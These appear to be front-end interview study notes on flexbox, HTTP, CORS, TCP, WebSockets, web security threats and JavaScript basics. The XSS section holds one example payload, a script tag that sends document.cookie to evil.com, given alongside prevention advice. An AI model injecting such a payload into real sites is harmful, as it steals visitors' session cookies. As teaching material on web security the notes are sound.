### Scenario Description
You have a large `div` element that contains three smaller `div` elements. The goal is to position these three child `div`s side by side — left, center, and right within the parent `div`. The left and right `div`s have a fixed width, while the center `div` should automatically adjust its width to occupy all remaining space.

### Solution and Explanation

To achieve this layout, you can use CSS Flexbox. Flexbox provides an efficient way to distribute space and align items within a container, even when their size is unknown or dynamic.

Here is a step-by-step guide to implement the described layout:

1. **Set the Display Property of the Parent `div`**: First, you need to define the parent `div` as a flex container. This is done by setting its `display` property to `flex`.

    ```css
    .parent {
        display: flex;
    }
    ```

2. **Define the Width of the Child `div`s**: Next, specify the width for the left and right child `div`s since they have a fixed size. The width can be set in pixels, ems, or any other CSS units.

    ```css
    .left, .right {
        width: 100px; /* Example fixed width */
    }
    ```

3. **Flexible Width for the Center `div`**: For the center `div`, you want it to fill the remaining space. This is achieved by setting the `flex-grow` property to a value greater than 0. Setting it to 1 tells the `div` to occupy any available space.

    ```css
    .center {
        flex-grow: 1;
    }
    ```

### Complete CSS Example

```css
.parent {
    display: flex;
}

.left, .right {
    width: 100px; /* Fixed width */
}

.center {
    flex-grow: 1; /* Occupies the remaining space */
}
```

### HTML Structure

```html
<div class="parent">
    <div class="left">Left</div>
    <div class="center">Center</div>
    <div class="right">Right</div>
</div>
```

### Key Takeaways

- **Flexbox** is a powerful layout tool in CSS that allows you to design complex layouts easily and responsively.
- The `flex-grow` property on a flex item allows it to expand and fill available space in a flex container, which is perfect for adaptive layouts.
- Setting the `display` property of a container to `flex` initiates a flex context, which then enables the use of Flexbox properties on its child elements.

# http-network.md

## Tell the difference of Ajax, Fetch and Axios

Ajax, Fetch, and Axios are all tools for making HTTP requests in web applications, but they have distinct characteristics and uses.

Overall, Ajax represents a classical approach to asynchronous web requests, while Fetch and Axios are modern techniques, with Axios providing a richer feature set and more user-friendly API than the native Fetch API.

### Ajax (Asynchronous JavaScript and XML)

1. **What it is**: Ajax is a technique that combines several technologies, including HTML, CSS, JavaScript, the DOM, XML, XSLT, and particularly the XMLHttpRequest object. It enables web pages to update asynchronously by exchanging data with the server in the background. This allows for updating specific sections of a webpage without needing to reload the entire page. 

2. **Code Example**:
   ```javascript
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
       if (this.readyState == 4 && this.status == 200) {
          document.getElementById("demo").innerHTML = this.responseText;
       }
   };
   xhttp.open("GET", "ajax_info.txt", true);
   xhttp.send();
   ```

### Fetch API

1. **What it is**: The Fetch API is a modern method for making web requests. It is part of the window object in modern browsers and provides a cleaner, promise-based approach to asynchronous requests, making it a more straightforward alternative to XMLHttpRequest.

2. **Code Example**:
   ```javascript
   fetch('https://api.example.com/data')
     .then(response => response.json())
     .then(data => console.log(data))
     .catch(error => console.error('Error:', error));
   ```

### Axios

1. **What it is**: Axios is a widely-used, promise-based HTTP client that works both in the browser and in node.js. It is a third-party library offering an enhanced and more intuitive API for making HTTP requests. It offers a simple yet extensible interface, capable of making XMLHttpRequests in the browser and HTTP requests in node.js. Axios supports the Promise API, can intercept requests and responses, transform data, cancel requests, and automatically handle JSON data. 

2. **Code Example**:
   ```javascript
   axios.get('https://api.example.com/data')
     .then(response => {
       console.log(response.data);
     })
     .catch(error => {
       console.error('Error:', error);
     });
   ```

## Describe TCP 3-way handshake and 4-way termination
### TCP 3-Way Handshake (Connection Establishment)
1. **SYN**: The client begins the handshake by sending a SYN (synchronize) packet to the server. This packet carries the client's initial sequence number, which is crucial for coordinating the subsequent data transfer.
2. **SYN-ACK**: In response, the server sends back a SYN-ACK (synchronize-acknowledge) packet. This packet acknowledges the client's SYN (hence the ACK) and also contains the server's initial sequence number, setting the stage for two-way communication.
3. **ACK**: The client completes the handshake by sending an ACK (acknowledge) packet to the server. This acknowledges the server's SYN-ACK packet, and with this, the connection is officially established, ready for data transfer.

### TCP 4-Way Termination (Connection Termination)
1. **FIN from Initiator**: The initiator (say, client A) of the termination sends a FIN (finish) packet to the other party (client B), signaling that it has no more data to send.
2. **ACK from Receiver**: Client B acknowledges the FIN from A by sending back an ACK (acknowledge) packet. At this point, A knows that B is aware of its intention to close the connection.
3. **FIN from Receiver**: After sending any remaining data, B sends its own FIN packet to A, indicating its readiness to close the connection.
4. **ACK from Initiator**: A responds with a final ACK packet acknowledging B's FIN. Post this, A can safely close the connection. B, upon receiving this ACK, will also close the connection. This ensures a clean and orderly termination of the connection from both ends.

## Why send options request when using HTTP cross origin?

### Understanding the Importance of OPTIONS Requests in Cross-Origin HTTP Communication

1. **Same-Origin Policy**: A fundamental security concept in web development, the same-origin policy restricts how a document or script loaded from one origin can interact with resources from another origin. This policy is implemented by web browsers to prevent potentially malicious scripts on one website from obtaining access to sensitive data on another website. A same origin is defined by matching the protocol, domain, and port of the two resources.

2. **Cross-Origin Resource Sharing (CORS)**: CORS is a mechanism that allows many resources (e.g., fonts, JavaScript, etc.) on a web page to be requested from another domain outside the domain from which the first resource was served. It's a way for servers to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading of resources.

3. **OPTIONS Preflight Request**: In CORS, an OPTIONS preflight request is automatically sent by the browser to determine whether the cross-origin request is safe to send. This preflight checks if the server will accept the actual request, based on its CORS policy. This request includes methods like GET, POST, or custom headers that might be used in the actual request.

4. **Cross-Origin Requests without Preflight**: Not all cross-origin requests need a preflight. Simple requests, like using GET or POST with certain headers, might not trigger this preflight check. However, more complex requests, especially those using methods like PUT or DELETE, or containing custom headers, generally require a preflight check.

### CORS Solutions

**Solution 1: JSONP Approach**
```html
<!-- On the client side -->
<script>
    window.onSuccess = function (data) {
        console.log(data);
    }
</script>
<script src="https://www.example.com/api/getData"></script>
```
In the JSONP (JSON with Padding) approach, a `<script>` tag is used to bypass the same-origin policy. The external script contains a function call with the desired data. While this method can circumvent CORS restrictions, it's limited in functionality and security.

**Solution 2: Server-Side CORS Configuration (Preferred)**
```javascript
// Server-side configuration for CORS
response.setHeader("Access-Control-Allow-Origin", "http://localhost:8011"); // or use '*' for all origins
response.setHeader("Access-Control-Allow-Headers", "X-Requested-With");
response.setHeader("Access-Control-Allow-Methods", "PUT, POST, GET, DELETE, OPTIONS");
response.setHeader("Access-Control-Allow-Credentials", "true"); // Allow cookies
```
This approach involves configuring the server to send appropriate CORS headers, allowing requests from specific origins or methods. It's the preferred method for handling cross-origin requests as it provides better control and security.

### Conclusion
An OPTIONS request is vital in the CORS process to ensure secure cross-origin communication. It helps browsers determine whether the server's CORS policy permits the actual request, thus enhancing web security by allowing servers to specify who can access their resources and how.

## What is Restful API
RESTful APIs are architectural guidelines for designing networked applications. They rely on stateless, client-server communication, where operations are performed using standard HTTP methods. For managing a blog, RESTful APIs provide endpoints for creating (POST), deleting (DELETE), updating (PATCH or PUT), and querying (GET) blog posts. Each operation targets a specific resource, identified by a URL, and uses the appropriate HTTP method to convey the action. For updates, PUT replaces an entire resource, while PATCH modifies parts of it, making PATCH more suitable for updates where only a few fields change. This approach to API design promotes scalability, simplicity, and flexibility.

## What is the difference between a token and a cookie in web requests?

### Cookie
A cookie is a small piece of data sent from a website and stored on the user's computer by the web browser while browsing. Cookies enable websites to remember stateful information (such as items in a shopping cart) or to record browsing activities (like logging in or visiting pages). They are also used to recall information entered into form fields, such as names and addresses.

- Cookies help maintain a user's session by being included in every request to identify the session due to HTTP's stateless nature.
- Servers send a "Set-Cookie" header to the client, with cookies limited to 4KB.
- Cookies are subject to Same-Origin Policy (SOP), preventing them from being shared across different origins.
- Before HTML5, cookies were used for data storage, but LocalStorage and SessionStorage are now preferred.

### Modern Browser Restrictions on Third-Party Cookies
Modern browsers are limiting or blocking third-party cookies to improve privacy. This is aimed at reducing third-party ads and trackers that invade privacy, separate from the Same-Origin Policy.

### Cookie and Session
- **Cookies** are used for login authentication, storing identifiers like a user ID.
- **Sessions** are server-side storage of user information linked to cookie identifiers.
- Cookies and sessions together maintain authenticated states across web requests. The process typically involves the client sending credentials, the server updating the session and setting a cookie, and subsequent requests being personalized and secure based on the cookie.

### Token
- Tokens, unlike cookies, are not part of the HTTP standards and can be customized. They need manual storage, such as in LocalStorage.
- Tokens are not automatically managed by browsers and must be manually set and sent in headers, for example, as "Authorization: Bearer <token>".
- Unlike cookies, tokens do not have inherent CORS limitations.
- **JWT (JSON Web Token)** is a common type of token that involves the backend authenticating a login request and returning an encrypted string token, which the client stores and includes in the header of subsequent requests.

### Follow up: Session vs Token, which is better
The choice between session and token-based authentication depends on the specific requirements and constraints of the application.  
For applications prioritizing server control over user sessions, quick user management actions, and where server resources are not a major concern, session-based authentication may be preferred.  
For applications requiring scalability across multiple servers, reduced server load, and flexibility in handling requests from various domains (thus minimizing CORS issues), token-based authentication is often the better choice.  
Both approaches have their merits and drawbacks, and the decision should align with the application's architectural needs, security requirements, and expected user load.  

### Follow up: How to Achieve SSO (Single Sign-On)?

Single Sign-On (SSO) is an authentication process that allows a user to access multiple systems with one set of login credentials. This process involves three parties: the client side, the server side (System A), and a third-party SSO provider. The SSO flow typically follows these steps:

1. **Client Side Accesses System A**: The user tries to access System A.
2. **Authentication Failure**: System A checks for a valid certificate. Finding none, it informs the client that authentication has failed and login is required.
3. **Redirect to SSO Provider**: The client is redirected to the SSO provider because it lacks an SSO certificate.
4. **SSO Login Request**: The SSO provider requests the client to log in.
5. **Client Side Login**: The user logs in to the SSO provider.
6. **SSO Certificate and Token Issuance**: Upon successful login, the SSO provider issues a ticket (token) and an SSO certificate to the client.
7. **Certificate Storage on Client Side**: The client stores the SSO certificate.
8. **System A Validates Certificate**: The client attempts to access System A again, this time presenting the SSO certificate. System A contacts the SSO provider to validate the certificate.
9. **Certificate Validation by SSO Provider**: The SSO provider authenticates the certificate and validates the ticket.
10. **Valid Ticket Acknowledgment**: System A receives a message from the SSO provider that the ticket is valid and proceeds to process the client's request.
11. **Data Returned to Client Side**: System A returns the requested data to the client.

**Key Concepts Related to SSO:**

- **SSO Certificate**: A digital certificate that confirms the user's identity. It's used by the client to prove authentication without logging in again.
- **Token (Ticket)**: A unique piece of data issued by the SSO provider that represents the user's authentication state. It's used for validating the user's session without re-entering credentials.
- **Authentication Flow**: The process by which a user's identity is verified across multiple applications or systems using a single set of credentials managed by the SSO provider.

**Benefits of SSO:**

- **Enhanced User Experience**: Users need to log in only once to access multiple applications, simplifying their interaction with web services.
- **Improved Security**: Centralizes the management of user credentials and authentication processes, reducing the likelihood of password fatigue and the risks associated with managing multiple credentials.
- **Simplified Administration**: Eases the burden of password resets, account lockouts, and other administrative tasks related to user access across multiple systems.

## Difference between HTTP and UDP

HTTP (Hypertext Transfer Protocol) and UDP (User Datagram Protocol) operate at different layers of the network stack, with HTTP functioning at the application layer and UDP at the transport layer.

### HTTP
- **Layer**: Application
- **Connection**: Connection-oriented
- **Reliability**: HTTP is built on TCP (Transmission Control Protocol), which ensures reliable transmission of data through error checking and retransmission of lost packets.
- **Use Cases**: Web browsing, form submission, data transfer in a reliable and ordered manner.
- **Characteristics**: HTTP requests and responses are structured in a predefined format, allowing for complex web interactions, including state management through cookies, authentication, and caching strategies.

### UDP
- **Layer**: Transport
- **Connection**: Connectionless
- **Reliability**: Does not guarantee delivery, order, or error checking, making it less reliable but faster compared to TCP.
- **Use Cases**: Streaming media (video, audio), online gaming, voice over IP (VoIP) where speed is crucial and occasional data loss is acceptable.
- **Characteristics**: Suitable for applications that require fast, efficient transmission, such as live broadcasting or multiplayer online games.

#### OSI Model Layers
1. Application Layer
2. Presentation Layer
3. Session Layer
4. Transport Layer (TCP, UDP)
5. Network Layer
6. Data Link Layer
7. Physical Layer

#### TCP/IP Model Layers
1. Application Layer (HTTP, DNS, SMTP)
2. Transport Layer (TCP, UDP)
3. Internet Layer (IP)
4. Network Interface Layer

### Follow-up: Difference between HTTP 1.0, 1.1, and 2.0

#### HTTP 1.0
- **Features**: Basic protocol supporting GET and POST methods.
- **Connection**: Each request opens a new TCP connection, leading to overhead and latency.

#### HTTP 1.1
- **Features**: Introduced more sophisticated caching mechanisms (Cache-Control, ETag), persistent connections (`Connection: keep-alive`) to allow multiple requests over a single connection, range requests, and additional methods like PUT and DELETE for RESTful APIs.
- **Performance**: Reduced latency by reusing connections, introduced chunked transfer encoding for dynamic content.

#### HTTP 2.0
- **Features**: Significantly improved performance through header compression (reducing overhead), multiplexing (allowing multiple requests and responses to be in flight simultaneously over a single TCP connection), and server push capabilities.
- **Adoption**: Increasingly widespread, offering substantial efficiency improvements over HTTP/1.x.

### Clarifications and Corrections
- The OSI model does not include a "web layer" but rather a network layer.
- The TCP/IP model simplifies the OSI layers into four layers, focusing on the internet protocol suite.
- HTTP 2.0 is not "the newest version" as HTTP/3 is emerging, utilizing QUIC (a transport layer network protocol) over UDP for even better performance in certain conditions.

## What is an HTTPS Man-in-the-Middle Attack? How Can It Be Prevented?

A Man-in-the-Middle (MitM) attack occurs when an attacker intercepts the communication between two parties, usually with the intent to secretly listen in or modify the messages being exchanged. In the context of HTTPS, this can be particularly damaging as HTTPS is designed to secure transmissions over the web, making any breach a serious concern.

### Symmetrical Encryption
Symmetrical encryption uses a single key for both encryption and decryption. This method is efficient and less resource-intensive, making it a cost-effective solution for many encryption needs.

### Asymmetrical Encryption
Asymmetrical encryption, on the other hand, involves two keys: a public key for encryption and a private key for decryption. This type of encryption is more secure but also more resource-intensive, leading to higher costs.

### HTTPS Encryption Process
- HTTP transmits data in plain text, making it vulnerable to interception and eavesdropping.
- HTTPS enhances security by encrypting the data transmitted between the client and the server. The encryption process involves:
  1. The client generates a random key and encrypts it with the server's public key, then sends this encrypted key to the server.
  2. The server decrypts the received key using its private key.
  3. Both parties use the random key for symmetric encryption, securing the subsequent communication.

The initial exchange of the random key uses asymmetrical encryption, ensuring that only the server can decrypt the key with its private key. The subsequent communication is secured through symmetrical encryption.

### Man-in-the-Middle Attack
During the asymmetrical encryption step, there's a risk that an attacker could intervene by presenting the client with the attacker's public key instead of the server's. This allows the attacker to decrypt, read, and potentially alter the communication by hijacking the session key.

### Prevention Measures
The primary defense against MitM attacks in the context of HTTPS is the use of certificates. Certificates are digital documents that verify the identity of the parties involved in the communication. They are issued by trusted third-party organizations known as Certificate Authorities (CAs). To prevent MitM attacks, it is crucial to:
- Ensure that the website's certificate is valid and issued by a reputable CA.
- The browser checks that the domain name in the certificate matches the website's domain.
- Use certificates from CAs that have established trust relationships with major browser vendors.

By adhering to these practices, both website owners and users can significantly reduce the risk of falling victim to MitM attacks, ensuring that their communications remain secure and private.

## Front-End Security Threats and Prevention Measures

### XSS (Cross-Site Scripting)
XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.

**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.

**Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.

### CSRF (Cross-Site Request Forgery)
In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.

**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.

**Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.

### Clickjacking
Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.

**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.

**Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.

### DDoS (Distributed Denial of Service)
DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.

**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.

**Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.

### SQL Injection
SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.

**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.

**Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.

### Best Practices for Prevention
Implementing robust security measures on both the front-end and back-end is crucial for protecting web applications against these attacks. This includes validating user inputs, employing security headers, and adhering to secure coding practices. Regular security audits and updates can also significantly reduce vulnerabilities.

## Websocket vs HTTP Protocol

### Websocket Protocol
- **Supports peer-to-peer communication**: Unlike HTTP, which is primarily designed for client-server communication, Websockets enable real-time, bi-directional communication between the client and server.
- **Protocol Name**: The Websocket protocol is indicated by `ws://` or `wss://` for secure Websockets, similar to how `http://` and `https://` indicate HTTP and HTTPS protocols.
- **Initiation**: A Websocket connection can be initiated by either the client or server side. This flexibility is particularly useful for applications that require real-time data exchange.
- **Use Cases**: It is widely used in applications requiring real-time interaction, such as message notifications, live discussion rooms, and collaborative editing platforms.
- **CORS Policy**: Websockets are not subject to the same-origin policy, which restricts how a document or script loaded from one origin can interact with resources from another origin. This means Websockets do not have CORS limitations.
- **Communication**: Communication over a Websocket is achieved through the `send` method for sending messages and the `onmessage` event handler for receiving messages. This contrasts with the request-response model used by HTTP.
- **Security**: A Websocket connection can be upgraded to a secure connection (`wss://`), analogous to upgrading HTTP to HTTPS, to ensure encrypted communication.

### Connection Steps
1. The process begins with a standard HTTP request.
2. If successful, the connection is upgraded to a Websocket protocol for ongoing communication.

### A Discussion Room Code Example: Node.js Side
```js
const { WebSocketServer } = require('ws');
const wsServer = new WebSocketServer({ port: 3000 });
const list = new Set();

wsServer.on('connection', curWs => {
    console.info('Connected');
    list.add(curWs);
    // Implement cleanup mechanism here to remove inactive connections

    curWs.on('message', msg => {
        console.info('Received message:', msg.toString());
        // Broadcast to other clients
        list.forEach(ws => {
            if (ws === curWs) return;
            ws.send(msg.toString());
        });
    });
});
```
*Note: It's important to implement a cleanup mechanism to remove inactive connections to prevent memory leaks.*

### Code Example: Website Side
```html
<script>
    const ws = new WebSocket('ws://127.0.0.1:3000');
    ws.onopen = () => {
        console.info('Opened');
        ws.send('Client opened');
    };
    ws.onmessage = event => {
        console.info('Received message:', event.data);
    };

    const btnSend = document.getElementById('btn-send');
    btnSend.addEventListener('click', () => {
        console.info('Clicked');
        ws.send('Current time: ' + Date.now());
    });
</script>
```

### Socket.IO
In practice, for ease of use and additional features, developers often use libraries like Socket.IO. Socket.IO abstracts the complexities of Websockets and provides a cleaner API, such as `socket.emit()` for sending messages and `io.on()` for listening to events.

### Difference between WebSocket and HTTP: keep-alive

The main difference between WebSocket and HTTP with the `keep-alive` connection option lies in the nature of the communication and the initiation of requests.

#### HTTP: keep-alive
- **Connection Type**: HTTP is a stateless protocol. By default, each request/response pair is followed by closing the connection. However, with the `keep-alive` option, the connection between the client and server can be kept open, allowing multiple requests to be sent over the same connection without having to re-establish it each time.
- **Client-Initiated**: In an HTTP communication, even with `keep-alive`, the client initiates all requests. The server cannot send data to the client unless the client first sends a request. This means the server must wait for the client to request data before it can send any.
- **Server Response**: With `keep-alive`, the server holds the connection open for a specified time (or until a specified number of requests have been sent), allowing for faster subsequent requests by avoiding the overhead of establishing new connections. However, the server is essentially in a wait state, responding to client requests as they come in without the ability to initiate communication.
- **Timeouts and Retries**: If the server takes too long to respond, the client might face timeouts and may need to retry its request. This mechanism doesn't inherently solve issues related to real-time data exchange or server push capabilities.

#### WebSocket
- **Bi-Directional Communication**: WebSocket provides a full-duplex communication channel that operates over a single, long-lived connection. Once established, this connection allows either the client or the server to initiate messages, breaking away from the request-response model.
- **Server and Client Initiation**: Unlike HTTP, WebSocket allows the server to send data to the client at any time once the WebSocket connection is established. This makes it ideal for real-time applications where the server needs to push updates to the client without waiting for a request.
- **Real-Time Interaction**: WebSocket is designed for applications that require real-time data exchange, such as live chat, gaming, or financial trading applications, where the overhead of establishing new connections for each message (as in HTTP) would be prohibitive.
- **Efficiency and Performance**: WebSocket connections are more efficient for real-time communication because they eliminate the HTTP overhead after the initial handshake. This makes WebSocket a better choice for scenarios where performance and latency are critical.

# javascript.md

## Why 0.1 + 0.2 !== 0.3

This is a result of how computers handle binary floating-point arithmetic.

When you add these approximations, the tiny errors in their representation lead to results that are not exact, hence 0.1 + 0.2 results in something slightly different from 0.3. This is an issue inherent in IEEE 754 standard for floating-point arithmetic, which is used by most modern programming languages.

In practical terms, to compare floating-point numbers in such cases, a common approach is to check if they are close enough to each other, within a small tolerance, rather than expecting exact equality.

## What is the JavaScript Prototype Chain? How is it Formed?

### The Concept of the Prototype Chain

In JavaScript, every object has a property called `prototype`, which refers to another object. This `prototype` object has its own `prototype`, and so on, until an object with a `null` prototype is reached, which is the end of the prototype chain. The chain is formed through these `prototype` links between objects.

When you try to access a property or method of an object, JavaScript engine will first search on the object itself. If it doesn't find it, it will look into the object's prototype, then the prototype's prototype, and so on, up the chain until it either finds the property/method or reaches the end of the chain (`null` prototype).

### How the Chain is Formed

The prototype chain is established through the constructor function of an object. When an object is created using a constructor function (using the `new` keyword), the newly created object's internal `[[Prototype]]` (often accessible as `__proto__`) property is set to the prototype object of the constructor function. This links the object to its prototype, forming a part of the chain.

### Example to Illustrate

```javascript
function Person(name) {
  this.name = name;
}

Person.prototype.sayHello = function() {
  console.log(`Hello, my name is ${this.name}`);
};

const alice = new Person('Alice');

alice.sayHello(); // Outputs: Hello, my name is Alice
console.log(alice.__proto__ === Person.prototype); // true
console.log(Person.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__); // null
```

In this example:
- `alice` is an instance of `Person`.
- `alice` inherits the `sayHello` method from `Person.prototype` via the prototype chain.
- The chain for `alice` looks like this: `alice` object --> `Person.prototype` --> `Object.prototype` --> `null`.
- This illustrates how `alice.sayHello()` is able to work: JavaScript searches `alice` for `sayHello`, doesn't find it, then moves up to `Person.prototype`, where it finds and executes the method.

## Array Flattening Function in JavaScript
Array flattening is the process of converting a nested array into a single-dimensional array. This is a common task in JavaScript to simplify array handling.
```ts
function arrayFlatten(arr: any[]): any[] {
    let flattenedArray = [];
    for (let i = 0; i < arr.length; i++) {
        if (Array.isArray(arr[i])) {
            flattenedArray = flattenedArray.concat(arrayFlatten(arr[i])); 
        } else {
            flattenedArray.push(arr[i]);
        }
    }
    return flattenedArray;
}
```

Second Implementation (Using `reduce`):   
This implementation is concise and correctly flattens the array using the `reduce` method combined with recursion.
```ts
function arrayFlatten(arr: any[]): any[]{
    return arr.reduce((prev, cur) => {
        return prev.concat(Array.isArray(cur) ? arrayFlatten(cur) : cur);
    }, []);
}
```

## Writing a `getType` Function in JavaScript
Determining the type of a variable accurately in JavaScript can be tricky due to the language's dynamic nature. The `typeof` operator, `instanceof` keyword, and `Object.prototype.toString.call()` method are commonly used techniques to identify variable types. e.g. `typeof 1` returns `'number'`, `typeof 'test'` returns `'string'`, and `typeof [1, 2, 3]` returns `'object'`. However, `typeof` has limitations, especially for reference types, where it returns `'object'` for arrays, null, and objects. To address this, the `Object.prototype.toString.call()` method provides a more detailed type check for reference types.
```ts
function getType(val: any): string {
    const type = typeof val;
    if (type !== 'object') {
        return type; // Returns 'number', 'string', 'boolean', etc.
    }
    // For objects, including arrays and null, use Object.prototype.toString
    return Object.prototype.toString.call(val).slice(8, -1).toLowerCase();
}
```

## What happens when you `new` an object, and how to simulate the `new` process with a method?

When the `new` keyword is used in JavaScript, it performs several actions behind the scenes to create a new instance of an object based on a constructor function. Here's what happens step by step, and how to simulate this process:

1. **Create an empty object** that inherits from the constructor function's prototype.
2. **Execute the constructor function** with the newly created object assigned to `this`.
3. **Return the new object** unless the constructor explicitly returns a different object.

The method to simulate the `new` process can be represented as follows:

```typescript
function _new(fn: Function, ...args: any[]): any {
    const obj = Object.create(fn.prototype); // Step 1
    const res = fn.apply(obj, args); // Step 2
    return res instanceof Object ? res : obj; // Step 3
}

// Test example
function Person(name: string) {
    this.name = name;
}
const person = _new(Person, 'Tom');
console.log(person.name); // Tom
```

### Understanding `class` as Syntactic Sugar

It's important to note that a `class` in JavaScript is essentially syntactic sugar over the existing prototype-based inheritance and does not introduce a new object-oriented inheritance model. At its core, a class is just a special type of function, and thus `typeof ClassName === 'function'`.

## Differences between `Object.create` and `{}`

Creating objects in JavaScript can be achieved in multiple ways, each with its own set of characteristics regarding prototype inheritance.

1. **Using `{}` (Object Literals)**: This is the most common way to create an object. The created object inherits from `Object.prototype`, making it an instance of Object.

    ```typescript
    const obj1 = {};
    console.log(obj1.__proto__ === Object.prototype); // true
    ```

2. **Using `Object.create(proto)`**: This method creates a new object with the specified object as its prototype. This allows for more flexibility in setting up the prototype chain.

    - **`Object.create(Object.prototype)`**: Creates a new object with `Object.prototype` as its prototype, similar to `{}`.
    - **`Object.create({name: 'Tom'})`**: Creates a new object with a custom object (`{name: 'Tom'}`) as its prototype, diverging from `Object.prototype`.

    ```typescript
    const obj2 = Object.create(Object.prototype);
    const obj3 = Object.create({name: 'Tom'});
    console.log(obj2.__proto__ === Object.prototype); // true
    console.log(obj3.__proto__ === Object.prototype); // false
    ```

## Depth-First Search (DFS) of a DOM Tree
Depth-First Search (DFS) is a method used to traverse or search a tree or graph data structure. The algorithm starts at the root node and explores as far as possible along each branch before backtracking. When applied to a DOM tree, DFS will visit each node in a manner that deeply explores a node's children before moving to its siblings.

### Code Example for DFS
The given TypeScript function `dfs` illustrates how DFS can be applied to a DOM tree. The `visitNode` function is used to log different types of nodes (Comment, Text, HTMLElement). In the `dfs` function, recursion is utilized to visit each node starting from the root, exploring all its child nodes deeply before moving to the next sibling.

```typescript
function visitNode(node: Node) {
    if (node instanceof Comment) {
        console.log('comment', node.textContent);
    }
    if (node instanceof Text) {
        const t = node.textContent.trim();
        if (t) {
            console.log('text', t);
        }
    }
    if (node instanceof HTMLElement) {
        console.log('element', node.tagName);
    }
}

function dfs(node: Node) {
    visitNode(node);
    node.childNodes.forEach((child) => {
        dfs(child);
    });
}
```

### Without Recursion
DFS can be implemented without recursion by using a stack to simulate the call stack of recursion. This approach avoids potential stack overflow errors that may occur with deep recursion. While recursion is more straightforward and readable, using a stack can be more efficient and safer for deep trees.

```typescript
function dfsWithoutRecursion(node: Node) {
    const stack = [node];
    while (stack.length) {
        const n = stack.pop();
        visitNode(n);
        Array.from(n.childNodes).reverse().forEach((child) => {
            stack.push(child);
        });
    }
}
```

## Breadth-First Search (BFS) of a DOM Tree
Breadth-First Search (BFS) is another method to traverse or search a tree or graph data structure. Unlike DFS, BFS explores all the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level. Applied to a DOM tree, BFS will visit each node level by level.

### Code Example for BFS
The `bfs` function demonstrates how BFS can be applied to a DOM tree. It uses a queue to visit each node at the current level before moving to the nodes at the next level. This approach ensures that nodes are visited in a breadth-wise manner.

```typescript
function bfs(node: Node) {
    const queue = [node];
    while (queue.length) {
        const n = queue.shift();
        visitNode(n);
        n.childNodes.forEach((child) => {
            queue.push(child);
        });
    }
}
```

### Key Differences Between DFS and BFS
- **DFS** dives as deep as possible into the tree's branches before backtracking, which can be implemented either recursively or using a stack.
- **BFS** visits all nodes at the current level before moving to the next level, using a queue to keep track of the order.

## Drawbacks of Arrow Functions and Situations Where They Can't Be Used

Arrow functions, introduced in ES6, provide a concise syntax and lexically bind the `this` value, but they have limitations in certain scenarios:

### Arrow Functions and `this` Context
Arrow functions do not have their own `this` context; they inherit it from the enclosing lexical scope. This feature is beneficial in some cases, such as callbacks where maintaining `this` from the outer context is desired. However, it limits their usage in other scenarios:

1. **Dynamic Context Callback Functions**: In event handlers, the `this` context is expected to be the element triggering the event. Arrow functions do not suit this because they do not bind their own `this`.

   ```typescript
   const btn = document.getElementById('btn');
   btn.addEventListener('click', () => {
       console.log(this === window); // `this` refers to the window, not the button
       // `this.innerHTML` will not work as expected
   });
   ```

2. **Function Scope and `this`**: In regular functions, `this` refers to the function's execution context, but in arrow functions, it refers to the enclosing context.

   ```typescript
   function f1() {
       console.log(this); // refers to the function's execution context
   }

   const f2 = () => {
       console.log(this); // refers to the lexical scope's context
   };
   ```

### `arguments` Object and Rest Parameters
Arrow functions do not have an `arguments` object, unlike regular functions. This limitation can be circumvented using rest parameters.

```typescript
function f1() {
   // Access to `arguments` object
}

const f2 = (...args) => {
   // Use `args` as an alternative to `arguments`
};
```

### Object and Prototype Methods
Arrow functions are not suitable for defining object or prototype methods where `this` is expected to refer to the object itself.

1. **Object Methods**:
   ```typescript
   const obj = {
       name: 'aaa',
       getName: () => this.name // `this` does not refer to `obj`
   };

   obj.getName(); // Will not work as expected
   ```

2. **Prototype Methods**:
   ```typescript
   function MyObject() {
       this.name = 'aaa';
   }

   MyObject.prototype.getName = () => this.name; // `this` does not refer to the instance of `MyObject`

   const myObj = new MyObject();
   myObj.getName(); // Will not work as expected
   ```

### Constructors
Arrow functions cannot be used as constructors. They cannot be used with the `new` keyword as they do not have their own `this` context, nor do they have a prototype.

```typescript
const Foo = (name, age) => {
    this.name = name;
    this.age = age;
};

const f = new Foo('aa', 20); // TypeError: Foo is not a constructor
```

### Summary
